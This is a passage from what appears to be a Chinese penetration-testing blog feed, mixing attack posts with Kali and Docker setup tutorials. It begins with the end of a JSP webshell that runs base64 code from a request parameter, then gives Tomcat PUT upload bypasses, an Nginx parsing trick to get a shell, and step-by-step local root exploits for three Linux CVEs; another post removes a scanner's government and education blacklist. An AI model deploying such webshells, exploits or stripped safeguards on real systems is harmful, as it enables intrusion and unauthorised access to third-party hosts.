class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line"></span><br><span class="line">    String cls = request.getParameter(&quot;password&quot;);</span><br><span class="line"></span><br><span class="line">    if (cls != null) &#123;</span><br><span class="line"></span><br><span class="line">        new U(this.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure><p><strong><code>二、其他上传方法，适用于Windows</code></strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">1.Windows下不允许文件以空格结尾以PUT /a001.jsp%20 HTTP/1.1上传到 Windows会被自动去掉末尾空格  </span><br><span class="line"></span><br><span class="line">2.Windows NTFS流Put/a001.jsp::$DATA HTTP/1.1  </span><br></pre></td></tr></table></figure><h1 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h1><h2 id="解析配置错误"><a href="#解析配置错误" class="headerlink" title="解析配置错误"></a>解析配置错误</h2><h3 id="利用条件-作用-8"><a href="#利用条件-作用-8" class="headerlink" title="利用条件&amp;作用"></a>利用条件&amp;作用</h3><p><strong><code>条件：php.ini中cgi.fix_pathinfo=1 ，在php-fpm.conf中security.limit_extensions= 为空时</code></strong></p><p><strong><code>作用：将图片文件当做PHP解析，可以直接Getshell</code></strong></p><h3 id="利用方法-8"><a href="#利用方法-8" class="headerlink" title="利用方法"></a>利用方法</h3><p>在条件符合的情况下，上传带一句话木马的图片(或者其他？)文件，例如为url&#x2F;a.jpg。</p><p>只需要url&#x2F;a.jpg&#x2F;.php就可以将图片文件当做php来解析</p><h1 id="Linux提权"><a href="#Linux提权" class="headerlink" title="Linux提权"></a>Linux提权</h1><h2 id="CVE-2021-4034"><a href="#CVE-2021-4034" class="headerlink" title="CVE-2021-4034"></a>CVE-2021-4034</h2><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p><strong>centos&#x2F;debian系验证</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">rpm -qa polkit</span><br><span class="line"></span><br><span class="line">dpkg -l policykit-1</span><br></pre></td></tr></table></figure><p>Debain stretch policykit-1 &lt; 0.105-18+deb9u2<br> Debain buster policykit-1 &lt; 0.105-25+deb10u1<br> Debain bookworm, bullseye policykit-1 &lt; 0.105-31.1<br> Ubuntu 21.10 (Impish Indri) policykit-1 &lt; 0.105-31ubuntu0.1<br> Ubuntu 21.04 (Hirsute Hippo) policykit-1 Ignored (reached end-of-life)<br> Ubuntu 20.04 LTS (Focal Fossa) policykit-1 &lt; 0.105-26ubuntu1.2)<br> Ubuntu 18.04 LTS (Bionic Beaver) policykit-1 &lt;0.105-20ubuntu0.18.04.6)<br> Ubuntu 16.04 ESM (Xenial Xerus) policykit-1 &lt;0.105-14.1ubuntu0.5+esm1)<br> Ubuntu 14.04 ESM (Trusty Tahr) policykit-1 &lt;0.105-4ubuntu3.14.04.6+esm1)<br> CentOS 6 polkit &lt; polkit-0.96-11.el6_10.2<br> CentOS 7 polkit &lt; polkit-0.112-26.el7_9.1<br> CentOS 8.0 polkit &lt; polkit-0.115-13.el8_5.1<br> CentOS 8.2 polkit &lt; polkit-0.115-11.el8_2.2<br> CentOS 8.4 polkit &lt; polkit-0.115-11.el8_4.2</p><h3 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h3><blockquote><p><strong>POC:<a href="https://sirbei.com/wp-content/uploads/2023/05/exp.zip">下载</a></strong><br> <strong>Github:(CVE-2021-4034)[<a href="https://github.com/arthepsy/CVE-2021-4034]">https://github.com/arthepsy/CVE-2021-4034]</a></strong></p></blockquote><ul><li><strong>先确定是否存在漏洞，将poc解压后的C文件，放到靶机内</strong></li><li><strong>执行以下命令即可提权</strong></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gcc exp.c -o exp</span><br><span class="line"></span><br><span class="line">./exp</span><br><span class="line"></span><br><span class="line">id</span><br></pre></td></tr></table></figure><h2 id="CVE-2022-0847"><a href="#CVE-2022-0847" class="headerlink" title="CVE-2022-0847"></a>CVE-2022-0847</h2><h3 id="影响范围-1"><a href="#影响范围-1" class="headerlink" title="影响范围"></a>影响范围</h3><p>Linux Kernel版本 &gt;&#x3D; 5.8<br> Linux Kernel版本 &lt; 5.16.11 &#x2F; 5.15.25 &#x2F; 5.10.102<br> Linux内核版本集合下载：<br> <a href="http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/">http://ftp.sjtu.edu.cn/sites/ftp.kernel.org/pub/linux/kernel/</a><br> <a href="https://www.kernel.org/">https://www.kernel.org/</a><br> debian内核安装:<strong><a href="https://blog.csdn.net/zhungcan/article/details/110956590">https://blog.csdn.net/zhungcan/article/details/110956590</a></strong></p><h3 id="攻击流程-1"><a href="#攻击流程-1" class="headerlink" title="攻击流程"></a>攻击流程</h3><p><a href="https://sirbei.com/wp-content/uploads/2022/03/1391355095.zip">编译文件源码</a></p><ul><li><strong>保存好编译文件源码</strong></li><li><strong>解压后的文件扔到靶机</strong></li><li><strong>执行gcc exp.c -o exp</strong></li><li><strong>.&#x2F;exp &#x2F;usr&#x2F;bin&#x2F;sudo 注：后面接上拥有SUID权限的文件</strong></li></ul><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216105941263.png" alt="image-20241216105940883"></p><h2 id="CVE-2021-3493"><a href="#CVE-2021-3493" class="headerlink" title="CVE-2021-3493"></a>CVE-2021-3493</h2><h3 id="影响范围-2"><a href="#影响范围-2" class="headerlink" title="影响范围"></a>影响范围</h3><p>Ubuntu 20.10<br> Ubuntu 20.04 LTS<br> Ubuntu 18.04 LTS<br> Ubuntu 16.04 LTS<br> Ubuntu 14.04 ESM</p><h3 id="攻击流程-2"><a href="#攻击流程-2" class="headerlink" title="攻击流程"></a>攻击流程</h3><p><a href="https://sirbei.com/wp-content/uploads/2022/03/2173420579.zip">CVE-2021-3493.zip</a></p><ul><li><p><strong>保存好编译文件源码</strong></p></li><li><p><strong>解压后的文件扔到靶机</strong></p></li><li><p><strong>执行gcc exp.c -o exp</strong></p></li><li><p>.&#x2F;exp</p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216105945588.png" alt="image-20241216105945391"></p></li></ul>]]></content>
      
      
      <categories>
          
          <category> 渗透经验分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kali如何设置字体大小（保姆级教程）</title>
      <link href="/2024/12/16/kali%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F%EF%BC%88%E4%BF%9D%E5%A7%86%E7%BA%A7%E6%95%99%E7%A8%8B%EF%BC%89/"/>
      <url>/2024/12/16/kali%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E5%AD%97%E4%BD%93%E5%A4%A7%E5%B0%8F%EF%BC%88%E4%BF%9D%E5%A7%86%E7%BA%A7%E6%95%99%E7%A8%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p>这篇我来教大家如何进行调大字体</p><h2 id="一、图标大小"><a href="#一、图标大小" class="headerlink" title="一、图标大小"></a><font style="color:rgb(79, 79, 79);">一、图标大小</font></h2><p><font style="color:rgb(77, 77, 77);">桌面【右键】选择【桌面设置】打开设置界面</font></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215201203304.png" alt="image-20241215201203124">调节到适合自己的大小即可（我调的是72)<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215201206287.png" alt="image-20241215201205886"></p><h2 id="二、菜单栏大小"><a href="#二、菜单栏大小" class="headerlink" title="二、菜单栏大小"></a><font style="color:rgb(79, 79, 79);">二、</font><a href="https://so.csdn.net/so/search?q=%E8%8F%9C%E5%8D%95%E6%A0%8F&spm=1001.2101.3001.7020"><font style="color:rgb(79, 79, 79);">菜单栏</font></a><font style="color:rgb(79, 79, 79);">大小</font></h2><p><font style="color:rgb(77, 77, 77);">在菜单栏空白处【右键】—选择【面板】—【面板首选项】</font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215201211931.png" alt="image-20241215201211649"><font style="color:rgb(77, 77, 77);">打开面板后选择【显示】—【尺寸】—调节【行大小】</font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215201215561.png" alt="image-20241215201215495"></p><p><font style="color:rgb(77, 77, 77);">我调的是55，大家可以根据自己的习惯来调大小</font></p><h2 id="三、终端字体"><a href="#三、终端字体" class="headerlink" title="三、终端字体"></a><font style="color:rgb(79, 79, 79);">三、终端字体</font></h2><p><em><font style="color:rgb(77, 77, 77);">最常用的就是命令行了，默认字体也是真的小。</font></em><font style="color:rgb(77, 77, 77);"><br></font><font style="color:rgb(77, 77, 77);">打开【终端】—【文件】—打开设置界面，【界面设置】—调节【字体】大小</font></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215201219141.png"></p><h2 id="四、系统字体"><a href="#四、系统字体" class="headerlink" title="四、系统字体"></a><font style="color:rgb(79, 79, 79);">四、系统字体</font></h2><p><em><font style="color:rgb(77, 77, 77);">这个地方设置了之后可以修改掉大部分的kali系统字体</font></em><font style="color:rgb(77, 77, 77);"><br></font><font style="color:rgb(77, 77, 77);">点击kali左上角的【应用程序】—右下角【设置管理】</font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215201222161.png" alt="image-20241215201221990"><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215201226132.png" alt="image-20241215201225625"></p><h2 id="五、标题字体"><a href="#五、标题字体" class="headerlink" title="五、标题字体"></a><font style="color:rgb(79, 79, 79);">五、标题字体</font></h2><p><font style="color:rgb(77, 77, 77);">同样是【应用程序】—【设置】—【窗口管理器】</font></p><p><font style="color:rgb(77, 77, 77);">打开设置界面—【样式】—【标题字体】<br></font><em><font style="color:rgb(77, 77, 77);">这个标题是所有的标题，包括终端的标题、设置界面的标题、工具的标题…</font></em></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215201229864.png" alt="image-20241215201229434"><font style="color:rgb(77, 77, 77);">整体完成的效果：</font><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215201233524.png" alt="image-20241215201233065"><font style="color:rgb(77, 77, 77);">通过以上步骤，你可以轻松地在</font><font style="color:rgb(78, 161, 219);">Kali Linux</font><font style="color:rgb(77, 77, 77);">中设置中文界面并调大字体。祝你使用愉快！</font></p>]]></content>
      
      
      <categories>
          
          <category> 渗透经验分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Kali如何设置成中文版（保姆级教程）</title>
      <link href="/2024/12/16/kali%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E6%88%90%E4%B8%AD%E6%96%87%E7%89%88%EF%BC%88%E4%BF%9D%E5%A7%86%E7%BA%A7%E6%95%99%E7%A8%8B%EF%BC%89/"/>
      <url>/2024/12/16/kali%E5%A6%82%E4%BD%95%E8%AE%BE%E7%BD%AE%E6%88%90%E4%B8%AD%E6%96%87%E7%89%88%EF%BC%88%E4%BF%9D%E5%A7%86%E7%BA%A7%E6%95%99%E7%A8%8B%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<p><font style="color:rgb(77, 77, 77);">使用Kali过程中可能会遇到安装时选错语言或者是使用Kali官方的</font><a href="https://so.csdn.net/so/search?q=%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%95%9C%E5%83%8F&spm=1001.2101.3001.7020"><font style="color:rgb(77, 77, 77);">虚拟机镜像</font></a><font style="color:rgb(77, 77, 77);">会导致卡里为英文那本教程来教会你如何调成中文</font></p><p><strong>1、首先我们切换成root用户</strong></p><p><u>su root</u></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215201143183.png" alt="image-20241215201136028"></p><p><strong>2、然后输入软件包进行配置</strong></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo dpkg-reconfigure locales</span><br></pre></td></tr></table></figure><p><font style="color:rgb(77, 77, 77);">回车后会看到在弹出的界面中，（我这个界面一直往下拉可以参考我这个界面它是在最底下原因是abcd来排的所以这一次后面要翻到最底下）使用方向键选择</font><strong><font style="color:rgb(77, 77, 77);">“zh_CN.UTF-8 UTF-8</font></strong><font style="color:rgb(77, 77, 77);">“，然后按下回车键进行确认。</font></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215201148598.png" alt="image-20241215201148512"></p><p>然后我们选择zh_CN这个再点击确认（要用tab键点击那个ok才算可以）<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215201151450.png" alt="image-20241215201151347"><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215201154290.png" alt="image-20241215201154194"></p><p>我们重新启动一下我们的kali机就可以了<img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241215201157414.png" alt="image-20241215201157010">以上就是kali机的改为中文版的方法</p>]]></content>
      
      
      <categories>
          
          <category> 渗透经验分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>灯塔ARL魔改（保姆级教程）</title>
      <link href="/2024/12/16/%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F%E7%A5%9E%E5%99%A8ARL%E5%A2%9E%E5%BC%BA%E6%94%B9%E9%80%A0/"/>
      <url>/2024/12/16/%E8%B5%84%E4%BA%A7%E6%89%AB%E6%8F%8F%E7%A5%9E%E5%99%A8ARL%E5%A2%9E%E5%BC%BA%E6%94%B9%E9%80%A0/</url>
      
        <content type="html"><![CDATA[<h3 id="拉取项目"><a href="#拉取项目" class="headerlink" title="拉取项目"></a><font style="color:rgb(0, 0, 0);">拉取项目</font></h3><p><font style="color:rgb(0, 0, 0);">首先从GitHub克隆到服务器上。</font></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/ki9mu/ARL-plus-docker/</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216132100621.png" alt="image-20241216132100453"></p><h3 id="修改配置文件"><a href="#修改配置文件" class="headerlink" title="修改配置文件"></a><font style="color:rgb(0, 0, 0);">修改配置文件</font></h3><p><font style="color:rgb(0, 0, 0);">因为ARL在配置文件里设置了黑名单，有时候项目为GOV或者EDU之类的时候无法进行扫描，所以在这里修改一下配置文件就可以解除限制。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd ARL-plus-docker/</span><br><span class="line">vi config-docker.yaml</span><br></pre></td></tr></table></figure><p><font style="color:rgb(0, 0, 0);">在这里删掉黑名单里的几项就可以了</font></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211165646711.png" alt="image-20241211165646619"></p><p><font style="color:rgb(0, 0, 0);">修改后：</font></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216132109335.png" alt="image-20241216132109252"></p><p><font style="color:rgb(0, 0, 0);">增加和修改riskiq以及fofa API</font></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211165649086.png" alt="image-20241211165649003"></p><p><font style="color:rgb(0, 0, 0);">再增强版里添加了Oneforall的模块，所以在配置文件里需要打开，因为clone下来的代码里默认是Flase，这里将需要想打开的开关替换为Ttue即可。</font></p><p>vi oneforall-config&#x2F;setting.py </p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211165651356.png" alt="image-20241211165651265"></p><p><font style="color:rgb(0, 0, 0);">修改后：</font></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211165654050.png" alt="image-20241211165653969"></p><p><font style="color:rgb(0, 0, 0);">修改为配置文件之后就开始启动docker，先添加一个volume，然后docker-compose up -d就可以直接启动，拉取镜像的时候如果很慢可以换一下docker源。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">docker volume create --name=arl_db</span><br><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211165656958.png" alt="image-20241211165656874"></p><p><font style="color:rgb(0, 0, 0);">当看到一排done就说明成功了，这时候还需要进容器修改一下python代码，因为在python脚本里也有黑名单。先使用docker ps看一下容器的ID，然后进入这个容器进行修改，使用vi进行编辑。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">docker ps #查看容器ID</span><br><span class="line">docker exec -it 对应ID bash</span><br><span class="line">vi app/config.py</span><br></pre></td></tr></table></figure><p><font style="color:rgb(0, 0, 0);">修改前：</font></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211165659762.png" alt="image-20241211165659653"></p><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211165702694.png" alt="image-20241211165702611"></p><h3 id="添加指纹"><a href="#添加指纹" class="headerlink" title="添加指纹"></a><font style="color:rgb(0, 0, 0);">添加指纹</font></h3><p><font style="color:rgb(0, 0, 0);">安装成功之后，添加一下指纹，让你的灯塔有更强大的指纹。</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/loecho-sec/ARL-Finger-ADD</span><br><span class="line">cd ARL-Finger-ADD</span><br><span class="line">python ARL-Finger-ADD.py -O https://vps:5003/  admin arlpassCOPY</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241211165705695.png" alt="image-20241211165705596"></p><h3 id="安装成功"><a href="#安装成功" class="headerlink" title="安装成功"></a><font style="color:rgb(0, 0, 0);">安装成功</font></h3><p><font style="color:rgb(0, 0, 0);">用默认密码登陆，然后在右上角修改掉默认密码就可以愉快的使用了。</font></p>]]></content>
      
      
      <categories>
          
          <category> 渗透经验分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>在Linux环境下安装 Docker最新教程</title>
      <link href="/2024/12/16/%E3%80%902025%E6%9C%80%E6%96%B0%E7%89%88%E3%80%91%E4%B8%89%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%AE%8C%E6%88%90Docker%E5%AE%B9%E5%99%A8%E5%AE%89%E8%A3%85/"/>
      <url>/2024/12/16/%E3%80%902025%E6%9C%80%E6%96%B0%E7%89%88%E3%80%91%E4%B8%89%E8%A1%8C%E5%91%BD%E4%BB%A4%E5%AE%8C%E6%88%90Docker%E5%AE%B9%E5%99%A8%E5%AE%89%E8%A3%85/</url>
      
        <content type="html"><![CDATA[<h1 id="在-Linux环境下安装-Docker最新教程"><a href="#在-Linux环境下安装-Docker最新教程" class="headerlink" title="在 Linux环境下安装 Docker最新教程"></a><font style="color:rgb(0, 0, 0);">在 Linux环境下安装 Docker最新教程</font></h1><p>很多小伙伴每次会遇到docker安装不起来，不是缺证书就是缺密钥，前段时间我自己开docker也开不起来，我找来找去不知道原因在哪里，一会说源有问题，一会说证书有问题，我真服了。然后这两天刚好要写毕业论文了，又需要docker了，我就重新安装一遍。发现很简单，只需要<strong>三条命令</strong>就行了，<strong>我的Linux版本是debian12.0的</strong>，centos或者乌班图的可以看官方文档，这篇我介绍我怎么安装的。<strong>看我有截图的部分即可！！！！</strong></p><h2 id="1、使用存储库安装apt！！！！！！（这是第一条命令）"><a href="#1、使用存储库安装apt！！！！！！（这是第一条命令）" class="headerlink" title="1、使用存储库安装apt！！！！！！（这是第一条命令）"></a>1、<a href="https://docs.docker.com/engine/install/debian/#install-using-the-repository"><font style="color:rgb(0, 0, 0);">使用存储库安装apt</font></a>！！！！！！（这是第一条命令）</h2><h2 id="在这之前一定要先更新！！！"><a href="#在这之前一定要先更新！！！" class="headerlink" title="在这之前一定要先更新！！！"></a>在这之前一定要先更新！！！</h2><h2 id="sudo-apt-upgrade：-更新已安装的软件包"><a href="#sudo-apt-upgrade：-更新已安装的软件包" class="headerlink" title="sudo apt upgrade： #更新已安装的软件包"></a><font style="color:rgb(0, 102, 0);">sudo apt upgrade： #更新已安装的软件包</font></h2><p><font style="color:rgb(0, 0, 0);">在新主机上首次安装 Docker Engine 之前，您需要 需要设置 Docker 存储库。之后，您可以安装和更新 存储库中的 Docker。</font><code>&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgb(225, 226, 230);&quot;&gt;apt&lt;/font&gt;</code></p><p><font style="color:rgb(0, 0, 0);">设置 Docker 的存储库。</font><code>&lt;font style=&quot;color:rgb(0, 0, 0);background-color:rgb(225, 226, 230);&quot;&gt;apt&lt;/font&gt;</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Add Docker&#x27;s official GPG key:</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get update</span><br><span class="line"><span class="built_in">sudo</span> apt-get install ca-certificates curl</span><br><span class="line"><span class="built_in">sudo</span> install -m 0755 -d /etc/apt/keyrings</span><br><span class="line"><span class="built_in">sudo</span> curl -fsSL https://download.docker.com/linux/debian/gpg -o /etc/apt/keyrings/docker.asc</span><br><span class="line"><span class="built_in">sudo</span> <span class="built_in">chmod</span> a+r /etc/apt/keyrings/docker.asc</span><br><span class="line"></span><br><span class="line"><span class="comment"># Add the repository to Apt sources:</span></span><br><span class="line"><span class="built_in">echo</span> \</span><br><span class="line">  <span class="string">&quot;deb [arch=<span class="subst">$(dpkg --print-architecture)</span> signed-by=/etc/apt/keyrings/docker.asc] https://download.docker.com/linux/debian \</span></span><br><span class="line"><span class="string">  <span class="subst">$(. /etc/os-release &amp;&amp; echo <span class="string">&quot;<span class="variable">$VERSION_CODENAME</span>&quot;</span>)</span> stable&quot;</span> | \</span><br><span class="line">  <span class="built_in">sudo</span> <span class="built_in">tee</span> /etc/apt/sources.list.d/docker.list &gt; /dev/null</span><br><span class="line"><span class="built_in">sudo</span> apt-get update</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216132027748.png" alt="image-20241216132019951"></p><p><strong>注意</strong></p><p><u><font style="color:rgb(0, 0, 0);">如果您使用衍生发行版（如 Kali Linux）、 您可能需要替换此命令中预期打印版本代号：</font></u></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$(. /etc/os-release &amp;&amp; echo &quot;$VERSION_CODENAME&quot;)</span><br></pre></td></tr></table></figure><p><u><font style="color:rgb(0, 0, 0);">将这部分替换为对应 Debian 版本的代号， 如。</font></u><code>&lt;u&gt;&lt;font style=&quot;background-color:rgb(225, 226, 230);&quot;&gt;bookworm&lt;/font&gt;&lt;/u&gt;</code></p><p><u><font style="color:rgb(0, 0, 0);">安装 Docker 软件包。</font></u><strong><u><font style="color:rgb(0, 0, 0);">（新机子安装的话可以不必理会）</font></u></strong></p><h2 id="2、安装最近的特定版本（这是第二条命令！！！！）"><a href="#2、安装最近的特定版本（这是第二条命令！！！！）" class="headerlink" title="2、安装最近的特定版本（这是第二条命令！！！！）"></a>2、安装最近的特定版本（这是第二条命令！！！！）</h2><hr><p><font style="color:rgb(0, 0, 0);">要安装最新版本，请运行：</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install docker-ce docker-ce-cli containerd.io docker-buildx-plugin docker-compose-plugin</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216132031211.png" alt="image-20241216132031002">直接复制粘贴命令安装docker的配置文件，然后我们点击Y就可以下载了，等待时间一分钟即可</p><hr><h2 id="3、通过运行映像来验证安装是否成功：（这是第三条命令！！！！！）"><a href="#3、通过运行映像来验证安装是否成功：（这是第三条命令！！！！！）" class="headerlink" title="3、通过运行映像来验证安装是否成功：（这是第三条命令！！！！！）"></a><font style="color:rgb(0, 0, 0);">3、通过运行映像来验证安装是否成功：（这是第三条命令！！！！！）</font></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker run hello-world</span><br></pre></td></tr></table></figure><p><img src="https://maodoo.oss-cn-beijing.aliyuncs.com/20241216132034315.png" alt="image-20241216132034099">出现了下面的hello form docker就<strong>说明你的docker已经安装成功了</strong></p><p><font style="color:rgb(0, 0, 0);">此命令将下载测试映像并在容器中运行它。当 container 运行时，它会打印确认消息并退出。</font></p><p><strong><font style="color:rgb(0, 0, 0);">现在，您已成功安装并启动 Docker Engine。</font></strong></p>]]></content>
      
      
      <categories>
          
          <category> 渗透经验分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试思路笔记</title>
      <link href="/2024/12/16/%E3%80%8C%E6%80%9D%E8%B7%AF%E7%AC%94%E8%AE%B0%E3%80%8D%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF%E7%AE%80%E8%AE%B0/"/>
      <url>/2024/12/16/%E3%80%8C%E6%80%9D%E8%B7%AF%E7%AC%94%E8%AE%B0%E3%80%8D%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E6%80%9D%E8%B7%AF%E7%AE%80%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="步骤简记"><a href="#步骤简记" class="headerlink" title="步骤简记"></a>步骤简记</h1><h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><ul><li>使用Oneforall收集子域名，将获取到的子域名放到txt中</li><li>使用nuclei批量扫描URL，扫描信息</li><li>先对目标IP进行扫描端口，然后对端口进行记录渗透</li><li>使用目录扫描工具，对目标站点进行扫描</li><li>如果是登录口，爆破一下账号密码</li><li>用FindSomething看一下JS，有没有泄露</li><li>使用漏洞检测工具，对目标站点进行扫描。例如xray与bp联动，进行被动扫描，nuclei | afrog进行漏洞扫描</li></ul><h1 id="漏洞发现思路"><a href="#漏洞发现思路" class="headerlink" title="漏洞发现思路"></a>漏洞发现思路</h1><h2 id="验证绕过"><a href="#验证绕过" class="headerlink" title="验证绕过"></a>验证绕过</h2><p><strong><code>备注：将Burp拦截的请求包发送后拦截响应包 </code></strong></p><blockquote><p><strong>先在代理页面拦截请求包，点击操作-拦截-拦截该请求的响应包</strong></p></blockquote><p><strong><code>适用的地方：验证码.......</code></strong></p><p><strong>对返回数据包进行修改，然后发送。例如: 请求数据包发送后对返回数据包进行拦截，对含false和http状态响应码之类的信息进行修改后发送。可能会达成验证绕过的作用</strong></p><h2 id="文件删除"><a href="#文件删除" class="headerlink" title="文件删除"></a>文件删除</h2><p><strong>如果删除功能是根据文件类似于uuid进行删除，那在获取公开文件的uuid的时候，将uuid截取，然后在删除文件的数据包对uuid进行替换进行测试，是否可以删除</strong></p><h2 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h2><p><strong>对于网站，寻找网站可能存在的上传文件点，并测试是否存在任意文件上传</strong></p><h2 id="短信接口无验证-短信轰炸"><a href="#短信接口无验证-短信轰炸" class="headerlink" title="短信接口无验证(短信轰炸)"></a>短信接口无验证(短信轰炸)</h2><p><strong>在可以发送验证码的地方进行抓包，查看是否进行加密，是否可以直接修改手机号发送请求包</strong></p><h2 id="弱口令问题"><a href="#弱口令问题" class="headerlink" title="弱口令问题"></a>弱口令问题</h2><ul><li><strong>注：如果遇到OA系统，可以先查找默认账号密码</strong></li><li><strong>观察传参参数是否加密可以暴力破解，同时对暴力破解进行弱口令测试。</strong></li></ul><h2 id="待测-绕过“请在微信客户端打开”"><a href="#待测-绕过“请在微信客户端打开”" class="headerlink" title="(待测)绕过“请在微信客户端打开”"></a>(待测)绕过“请在微信客户端打开”</h2><p><strong>UA</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/98.0.4758.102 Safari/537.36 NetType/WIFI MicroMessenger/7.0.20.1781(0x6700143B) WindowsWechat(0x6309021a) XWEB/6763</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 渗透经验分享 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>反弹shell的几种方法</title>
      <link href="/2024/12/15/%E5%8F%8D%E5%BC%B9shell%E7%9A%84%E5%87%A0%E7%A7%8D%E6%96%B9%E6%B3%95/"/>
